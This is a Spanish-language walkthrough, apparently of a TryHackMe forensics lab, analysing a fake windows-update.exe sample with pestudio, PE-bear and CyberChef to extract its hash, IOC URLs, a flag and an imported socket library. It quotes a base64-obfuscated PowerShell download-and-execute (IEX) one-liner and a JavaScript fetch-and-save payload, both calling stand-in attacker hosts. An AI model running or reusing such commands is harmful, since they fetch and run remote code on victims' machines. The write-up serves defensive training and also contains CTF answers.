En este laboratorio, se me informa que:
- El archivo del malware está localizado en `C:\Users\DFIRUser\Desktop\windows-update.exe`
- Y las herramientas a usar están en la carpeta: `C:\Users\DFIRUser\DFIR Tools`, en la cual, hay varias herramientas/carpetas de las mismas (por ejemplo de disk analysis, no es una herramienta, es una explicación de la misma, en este caso, almacena FTK imager, mientras que HxD si que es una herramienta):
	- Aurora
	- Browser Analysis
	- Data Triaging
	- DCode v5
	- Disk Analysis
	- Email Analysis
	- exiftool
	- EZ tools
	- HxD
	- LofFileParser
	- Malware analysis
	- Memory Analysis
	- Network Analysis
	- Nmap
	- PersistenceSniper
	- pestudio
	- Recovery Data
	- Registry analysis
	- Sleuth Kit
	- SysinternalsSuite
	- USB Analysis

![img](img_Shadow_Trace/Pasted%20image%2020260722083834.png)

## 1.Cual es la arquitectura del arhcivo binario de windows update.exe?
Voy a empezar usando la herramienta pestudio, la cual es una herramienta de análisis estático de ejecutables, principalmente buscando malware.
Desde la primera sección misma al cargar el archivo windows updater, en la sección de `file > type` se ve:
- Ejecutable (Executable)
- *64-bit*
- console

![img](img_Shadow_Trace/Pasted%20image%2020260722090057.png)

## 2. Hash (SHA-256) de update.exe
Para saber el hash sha-256 del archivo, se puede simplemente usar el cmd. Se puede usar certutil con el comando: `certutil -hashfile windows-update.exe SHA256` y el resultado es:
b2a88de3e3bcfae4a4b38fa36e884c586b5cb2c2c283e71fba59efdb9ea64bfc

![img](img_Shadow_Trace/Pasted%20image%2020260722090955.png)

O también se puede ver desde el análisis estático de pestudio

![img](img_Shadow_Trace/Pasted%20image%2020260722091348.png)

## 3. URL en el archivo para usarlo como un IOC
Para poder ver la URL se puede volver a usar pestudio, con la cual, en la sección de indicators (import > flag), en la fila de string > url-pattern, se ve la url del archivo: 
`http://tryhatme.com/update/security-update.exe`

![img](img_Shadow_Trace/Pasted%20image%2020260722091039.png)

## 4. Dominio que se puede usar como IOC?
Para poder detectar el dominio, aunque en un primer lugar se piense que se puede seguir usando pestudio, como yo pensé, me acordé de que tenía a disposición mas herramientas, por ejemplo, puedo usar pe-bear

![img](img_Shadow_Trace/Pasted%20image%2020260722093347.png)

En la ruta `C:\Users\DFIRUser\DFIR Tools\Malware Analysis\PE-Bear`
Hay que tener en cuenta que pe-bear es una herramienta de analisis de archivos ejecutables, como pestudio, q permite ver la estructura de un archivo binario
En pe-bear, abro el archivo windows updater para exlorarlo desde ahí

![img](img_Shadow_Trace/Pasted%20image%2020260722093636.png)

Una vez abierto, selecciono la opción "padre", la de windows-update.exe, y voy a la sección de strings. Ya que estoy buscando un dominio, y sabiendo que la url es http (`http://tryhatme.com/update/security-update.exe`) , voy a buscar tryhatme 

![img](img_Shadow_Trace/Pasted%20image%2020260722094132.png)

Se ven 3 opciones:
- `http://tryhatme.com/update/security-update.exe`
- `tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`
- `responses.tryhatme.com` siendo esta la respuesta por ser el dominio que se puede usar como indicador de compromiso
## 5. Flag del dominio
Aún en la pregunta anterior, se ve que se ha detectado la URL, el dominio IOC, y que hay uno más, el cual termina por =, lo cual puede dar a entender que está codificado, principalmente en base 64, `tryhatme.com/VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=`
VEhNe3lvdV9nMHRfc29tZV9JT0NzX2ZyaWVuZH0=
Por lo que voy a usar cyberchef para decodificarlo

![img](img_Shadow_Trace/Pasted%20image%2020260722094633.png)

Dando como resultado:
THM{you_g0t_some_IOCs_friend}
## 6. Que librería relacionada con la comunicación mediante sockets carga el archivo binario?
Para esta pregunta, puedo volver a pestudio, ya que, de hecho, vi una sección llamativa antes respecto a esta pregunta, libraries (flag>3). 

![img](img_Shadow_Trace/Pasted%20image%2020260722094842.png)

Como me pregunta sobre los sockets, voy a la única fila que lo tiene como descripción (Windows Socket library), desde ella, se ve el nombre de la librería: WS2_32.dll 

![img](img_Shadow_Trace/Pasted%20image%2020260722094934.png)

A partir de aquí, el enfoque del CTF cambia, siendo ahora más un ejercicio 9nteractivo más que una máquina virtual

![img](img_Shadow_Trace/Pasted%20image%2020260722171053.png)

## 7. Detectar URL Maliciosa "activada" del proceso powershell.exe
El evento producido el dia `Jul 22nd 2026 at 15:01` es el que tiene información sobre un proceso de powershell.exe, por lo que voy a investigar ese. En command, `(new-object system.net.webclient).DownloadString([Text.Encoding]::UTF8.GetString([Convert]::FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl"))) | IEX;` la parte de `FromBase64String("aHR0cHM6Ly90cnloYXRtZS5jb20vZGV2L21haW4uZXhl` indica que es un texto codificado, en base 64, por lo que voy a usar cyberchef para sacar el comando completo y, posiblemente, la URL.

![img](img_Shadow_Trace/Pasted%20image%2020260722171544.png)

Dando como resultado :`https://tryhatme.com/dev/main.exe`
## 8. Detectar URL maliciosa de la alerta de chrome.exe
Ahora, para esta, igual que la anterior, en la columna de process, se ve chrome.exe, por lo que ya se en cual enfocarme en este caso. En command, me llama la atención la parte de `104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101` lo cual, al ser numérico, puede dar a entender que es algún tipo de codificación, decimal diría yo al ver q en la secuencia no hay letras, solo números del 1 al 9. Teniendo en cuenta eso, voy a meterlo a cyberchef para ver el resultado
(Tuve que cambiar la receta a comas `,` en lugar de espacios)

![img](img_Shadow_Trace/Pasted%20image%2020260722173307.png)

Siendo la respuesta: `https://reallysecureupdate.tryhatme.com/update.exe`
## 9. Nombre del archivo guardado en la alerta de chrome.exe

Esta se ve en el propio comando de chrome.exe: `fetch([104,116,116,112,115,58,47,47,114,101,97,108,108,121,115,101,99,117,114,101,117,112,100,97,116,101,46,116,114,121,104,97,116,109,101,46,99,111,109,47,117,112,100,97,116,101,46,101,120,101].map(c=>String.fromCharCode(c)).join('')).then(r=>r.blob()).then(b=>{const u=URL.createObjectURL(b);const a=document.createElement('a');a.href=u;a.download='test.txt';document.body.appendChild(a);a.click();a.remove();URL.revokeObjectURL(u);});` 
El archivo guardado es test.txt

